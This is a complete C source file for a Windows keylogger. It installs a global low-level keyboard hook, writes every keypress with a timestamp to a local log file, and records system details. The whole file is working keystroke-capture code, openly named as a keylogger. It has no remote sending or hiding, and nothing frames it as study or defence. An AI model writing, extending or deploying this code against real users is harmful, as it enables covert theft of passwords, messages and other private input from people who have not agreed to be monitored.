#include <stdio.h>
#include <windows.h>
#include <time.h>
#include <sysinfoapi.h>
#include "include/keylogger.h"
#include "include/utils.h"

#define LOG_INTERVAL 1000

LRESULT CALLBACK keyboard_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbStruct->vkCode;

        char key_name[16];
        UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);

        switch (vkCode) {
            case VK_RETURN: strcpy(key_name, "[ENTER]"); break;
            case VK_SPACE: strcpy(key_name, "[SPACE]"); break;
            case VK_BACK: strcpy(key_name, "[BACKSPACE]"); break;
            case VK_TAB: strcpy(key_name, "[TAB]"); break;
            case VK_SHIFT:
            case VK_LSHIFT:
            case VK_RSHIFT: strcpy(key_name, "[SHIFT]"); break;
            case VK_CONTROL:
            case VK_LCONTROL:
            case VK_RCONTROL: strcpy(key_name, "[CTRL]"); break;
            case VK_MENU:
            case VK_LMENU:
            case VK_RMENU: strcpy(key_name, "[ALT]"); break;
            case VK_CAPITAL: strcpy(key_name, "[CAPS LOCK]"); break;
            case VK_ESCAPE: strcpy(key_name, "[ESC]"); break;
            default:
                GetKeyNameTextA(scanCode << 16, key_name, sizeof(key_name));
        }

        FILE *file = fopen("logs/keylogs.txt", "a");
        if (file == NULL) {
            fprintf(stderr, "Failed to open log file!\n");
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }

        SYSTEMTIME time;
        GetLocalTime(&time);
        fprintf(file, "[%02d-%02d-%04d %02d:%02d:%02d] %s\n", 
                time.wDay, time.wMonth, time.wYear,
                time.wHour, time.wMinute, time.wSecond, 
                key_name);

        fclose(file);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void log_system_info() {
    FILE *file = fopen("logs/keylogs.txt", "a");
    if (file == NULL) {
        fprintf(stderr, "Failed to open log file!\n");
        return;
    }

    SYSTEM_INFO siSysInfo;
    GetSystemInfo(&siSysInfo);

    fprintf(file, "System Information:\n");
    fprintf(file, "  OEM ID: %u\n", siSysInfo.dwOemId);
    fprintf(file, "  Number of processors: %u\n", siSysInfo.dwNumberOfProcessors);
    fprintf(file, "  Page size: %u\n", siSysInfo.dwPageSize);
    fprintf(file, "  Processor type: %u\n", siSysInfo.dwProcessorType);
    fprintf(file, "  Minimum application address: %lx\n", siSysInfo.lpMinimumApplicationAddress);
    fprintf(file, "  Maximum application address: %lx\n", siSysInfo.lpMaximumApplicationAddress);
    fprintf(file, "  Active processor mask: %u\n", siSysInfo.dwActiveProcessorMask);

    fclose(file);
}

int main(void) {
    printf("Keylogger started. Press Ctrl+C to exit.\n");

    CreateDirectory("logs", NULL);

    log_system_info();

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_proc, NULL, 0);
    if (hook == NULL) {
        fprintf(stderr, "Failed to install hook!\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    return 0;
}
